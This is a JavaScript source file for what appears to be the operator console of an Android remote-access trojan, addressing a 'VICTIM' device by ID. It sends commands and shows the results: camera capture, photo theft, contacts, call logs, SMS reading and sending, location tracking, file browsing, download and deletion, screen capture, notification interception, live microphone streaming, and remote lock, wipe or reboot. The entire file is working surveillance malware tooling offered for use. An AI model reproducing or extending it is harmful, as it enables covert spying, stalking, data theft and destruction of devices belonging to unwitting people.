"use strict";
const api = window.api;
const $ = (id) => document.getElementById(id);
const VICTIM = new URLSearchParams(location.search).get("v") || "";

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

// ---- generic order buttons ---------------------------------------------
document.querySelectorAll("[data-order]").forEach((b) => {
  b.onclick = () => {
    const payload = JSON.parse(b.dataset.order);
    api.order(VICTIM, payload);
    out(b.closest(".card").querySelector(".out")?.id || "o-util", `<span class="dim">sent ${payload.order}…</span>`);
  };
});

function out(id, html) {
  const el = $(id);
  if (el) el.innerHTML = html;
}

function tableHtml(headers, rows) {
  if (!rows.length) return "<p class='empty'>no data</p>";
  return `<table><thead><tr>${headers.map((h) => `<th>${h}</th>`).join("")}</tr></thead>
    <tbody>${rows.map((r) => `<tr>${r.map((c) => `<td>${c}</td>`).join("")}</tr>`).join("")}</tbody></table>`;
}

function imageHtml(data, cap) {
  if (data && data.image === true && data.base64) {
    return `<div class="dim" style="margin-bottom:4px">${esc(cap || "")} (${Math.round(data.base64.length * 3 / 4 / 1024)} KB)</div>
            <img src="data:image/jpeg;base64,${data.base64}">`;
  }
  return `<pre>${esc(JSON.stringify(data, null, 2))}</pre>`;
}

// ---- per-event handling --------------------------------------------------
api.onEvent(({ victim, name, data }) => {
  if (victim !== VICTIM) return;

  switch (name) {
    case "x0000ca":
      if (data && data.cameraList) {
        out("o-ca", `<pre>${esc(JSON.stringify(data.cameraList, null, 2))}</pre>`);
      } else {
        out("o-ca", imageHtml(data, "photo"));
      }
      break;

    case "x0000getAllImages": {
      const imgs = (data && data.images) || [];
      const rows = imgs.map((im) => [
        esc(im.imageName || ""),
        esc((im.imageSize ? (im.imageSize / 1024).toFixed(0) + " KB" : "?")),
        `<button data-img='${esc(JSON.stringify({ path: im.imagePath, name: im.imageName }))}'>Fetch</button>`,
      ]);
      out("o-imgs",
        `<div class="dim">${data.imageCount || imgs.length} image(s)</div>` +
        tableHtml(["name", "size", ""], rows));
      document.querySelectorAll("[data-img]").forEach((b) => {
        b.onclick = () => {
          const a = JSON.parse(b.dataset.img);
          api.order(VICTIM, { order: "x0000getImage", path: a.path, name: a.name });
          out("o-img", `<span class="dim">fetching ${esc(a.name)}…</span>`);
        };
      });
      break;
    }

    case "x0000getImage":
      out("o-img", imageHtml(data, data.imageName || "image"));
      break;

    case "x0000mc":
      out("o-mc", `<pre>${esc(JSON.stringify(data))}</pre>`);
      break;

    case "x0000lm": {
      const d = data || {};
      const map = d.lat != null
        ? `<div class="row"><a target="_blank" href="https://www.openstreetmap.org/?mlat=${d.lat}&mlon=${d.lng}#map=16/${d.lat}/${d.lng}">open in map ↗</a></div>` : "";
      out("o-loc", `<pre>${esc(JSON.stringify(d, null, 2))}</pre>${map}`);
      break;
    }

    case "x0000cn": {
      const rows = (data.contactsList || []).map((c) => [esc(c.name || ""), esc(c.number || "")]);
      out("o-cn", tableHtml(["name", "number"], rows));
      break;
    }

    case "x0000cl": {
      const rows = (data.callsList || []).map((c) => [esc(c.name || ""), esc(c.number || ""), esc(c.duration || "")]);
      out("o-cl", tableHtml(["name", "number", "duration"], rows));
      break;
    }

    case "x0000sm":
      if (Array.isArray(data.smsList)) {
        const rows = data.smsList.map((m) => [esc(m.phoneNo || ""), esc(m.msg || "")]);
        out("o-sm", tableHtml(["from", "message"], rows));
      } else {
        out("o-sm", `<pre>send result: ${esc(JSON.stringify(data))}</pre>`);
      }
      break;

    case "x0000apps": {
      const rows = (data.appsList || []).map((a) => [
        `<button class="runa" data-pkg='${esc(a.packageName || "")}'>▶</button>`,
        esc(a.appName || ""),
        esc(a.packageName || ""),
        esc(a.versionName || ""),
      ]);
      out("o-apps", tableHtml(["", "app", "package", "v"], rows));
      document.querySelectorAll(".runa").forEach((b) => {
        b.onclick = () => {
          const pkg = b.dataset.pkg;
          api.order(VICTIM, { order: "x0000runApp", extra: pkg });
          out("o-util", `<span class="dim">launching ${esc(pkg)}…</span>`);
        };
      });
      break;
    }

    case "x0000fm":
      if (Array.isArray(data)) {
        const rows = data.map((f) => [
          f.isDir ? "📁" : "📄",
          esc(f.name || ""),
          esc(f.size || ""),
          f.isDir
            ? `<button class="nav" data-p='${esc(f.path || "")}'>open</button>`
            : `<button class="dld" data-p='${esc(f.path || "")}'>download</button>`,
        ]);
        out("o-fm", tableHtml(["", "name", "size", ""], rows));
        document.querySelectorAll(".nav").forEach((b) => {
          b.onclick = () => { $("fm-path").value = b.dataset.p; listFm(); };
        });
        document.querySelectorAll(".dld").forEach((b) => {
          b.onclick = () => {
            api.order(VICTIM, { order: "x0000fm", extra: "dl", path: b.dataset.p });
            out("o-fm", `<span class="dim">downloading ${esc(b.dataset.p)}…</span>`);
          };
        });
      } else {
        out("o-fm", `<pre>${esc(JSON.stringify(data))}</pre>`);
      }
      break;

    case "x0000sc":
      out("o-sc", imageHtml(data, "screen capture"));
      break;

    case "x0000nt": {
      const box = $("o-nt");
      const d = data || {};
      const el = document.createElement("div");
      el.className = "notif";
      el.innerHTML = `<b>${esc(d.appName || "?")}</b><span class="pill">${esc(d.postTime || "")}</span>
        <div>${esc(d.title || "")}${d.content ? " — " + esc(d.content) : ""}</div>`;
      box.prepend(el);
      break;
    }

    case "x0000runApp":
    case "x0000openUrl":
    case "x0000deleteFF":
    case "x0000dm":
    case "x0000lockDevice":
    case "x0000wipeDevice":
    case "x0000rebootDevice":
      out("o-util", `<pre>${esc(JSON.stringify(data, null, 2))}</pre>`);
      break;

    default:
      out("o-util", `<pre>${esc(name)}: ${esc(JSON.stringify(summarize(data)))}</pre>`);
  }
});

function summarize(data) {
  if (data && typeof data === "object" && data.base64) return { ...data, base64: `<${Math.round(data.base64.length * 3 / 4 / 1024)} KB>` };
  return data;
}

// ---- live mic streaming -------------------------------------------------
let audioCtx = null;
let playAt = 0;
let liveOn = false;

api.onAudio(({ victim, chunk }) => {
  if (victim !== VICTIM || !liveOn || !audioCtx) return;
  try {
    const bin = atob(chunk);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const samples = new Int16Array(bytes.buffer);
    const buf = audioCtx.createBuffer(1, samples.length, 16000);
    buf.copyToChannel(samples, 0);
    const src = audioCtx.createBufferSource();
    src.buffer = buf;
    src.connect(audioCtx.destination);
    if (playAt < audioCtx.currentTime + 0.05) playAt = audioCtx.currentTime + 0.05;
    src.start(playAt);
    playAt += buf.duration;
  } catch (e) { /* skip bad chunk */ }
});

api.onAudioStop(({ victim, reason }) => {
  if (victim !== VICTIM) return;
  liveOn = false;
  if (audioCtx) { try { audioCtx.close(); } catch (e) {} audioCtx = null; }
  $("livebtn").textContent = "▶ Live stream";
  $("livebtn").classList.remove("on");
  out("o-mc", `<span class="dim">stream stopped (${esc(reason || "stop")}); .wav saved on the server</span>`);
});

$("livebtn").onclick = () => {
  if (liveOn) {
    // toggle off -> tell the agent to stop streaming
    api.order(VICTIM, { order: "x0000listenMic" });
    return;
  }
  liveOn = true;
  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  playAt = audioCtx.currentTime + 0.1;
  $("livebtn").textContent = "■ Stop stream";
  $("livebtn").classList.add("on");
  api.order(VICTIM, { order: "x0000listenMic" });
  out("o-mc", `<span class="dim">streaming… (agent 16 kHz PCM, saved as .wav on stop)</span>`);
};

// ---- custom inputs --------------------------------------------------------
function listFm() {
  api.order(VICTIM, { order: "x0000fm", extra: "ls", path: $("fm-path").value || "/storage/emulated/0" });
}
$("fm-ls").onclick = listFm;
$("fm-path").addEventListener("keydown", (e) => { if (e.key === "Enter") listFm(); });

$("sms-send").onclick = () => {
  const to = $("sms-to").value.trim();
  const txt = $("sms-txt").value;
  if (!to || !txt) return;
  api.order(VICTIM, { order: "x0000sm", extra: "sendSMS", to, sms: txt });
  out("o-sm", `<span class="dim">sending SMS to ${esc(to)}…</span>`);
};

$("ut-runb").onclick = () => {
  const pkg = $("ut-run").value.trim();
  if (pkg) api.order(VICTIM, { order: "x0000runApp", extra: pkg });
};
$("ut-urlb").onclick = () => {
  const url = $("ut-url").value.trim();
  if (url) api.order(VICTIM, { order: "x0000openUrl", url });
};
$("ut-call").onclick = () => {
  const num = $("ut-num").value.trim();
  if (num) api.order(VICTIM, { order: "x0000dm", number: num });
};
$("ut-delb").onclick = () => {
  const p = $("ut-del").value.trim();
  if (p) api.order(VICTIM, { order: "x0000deleteFF", fileFolderPath: p });
};

$("app-filter").addEventListener("input", () => {
  const q = $("app-filter").value.toLowerCase();
  document.querySelectorAll("#o-apps tbody tr").forEach((tr) => {
    tr.style.display = tr.textContent.toLowerCase().includes(q) ? "" : "none";
  });
});

$("back").onclick = () => window.close();
$("vicname").textContent = `(${VICTIM.slice(0, 8)})`;
